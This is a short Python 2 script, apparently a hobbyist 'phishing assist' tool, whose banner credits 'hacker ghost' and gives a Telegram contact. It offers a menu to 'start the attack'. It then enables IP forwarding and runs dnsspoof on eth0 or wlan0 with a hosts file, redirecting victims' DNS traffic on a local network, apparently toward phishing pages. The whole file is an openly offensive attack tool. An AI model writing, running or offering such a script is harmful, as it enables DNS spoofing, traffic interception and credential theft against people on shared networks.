from os import system
import sys


def logo():



  print '======================================================='
  print '=        create by hacker ghost                       ='
  print '======================================================='
  print '=        Assist for phishing tools                    ='
  print '+++++++++++++++++++++++++++++++++++++++++++++++++++++++'
  print '=                     V.1.0                           ='
  print '+++++++++++++++++++++++++++++++++++++++++++++++++++++++'
  print '=  contact me on telegram https://t.me/nahom_0ghost   ='
  print '======================================================='

system('clear')

logo()

print '[1] start the attack'
print '[2]exit'
option = input("==>")
if option == 1:
    system('clear')
else:
    system('clear')
    logo()
    print 'thanks for using the tool'
    exit()
logo()

print '[1] for selecting eth0 as interface'
print '[2] for selecting wlan0 as interface'
print '[3] exit'
option2 = input("==>")
if option2 == 1:
  system('echo 1 > /proc/sys/net/ipv4/ip_forward')
  print 'trying to find victum on eth0 .........................'
  print 'now please youth your phishing tool'
  system('dnsspoof  -i eth0 -f hosts.txt')
if option2 == 2:
  system('echo 1 > /proc/sys/net/ipv4/ip_forward')
  print 'trying to find victumon wlan0........................... '
  print 'now please youth your phishing tool'
  system('dnsspoof  -i wlan0 -f hosts.txt')
if option2 == 3:
  system('clear')
  logo()
  print 'thanks for using the tool'
  exit()
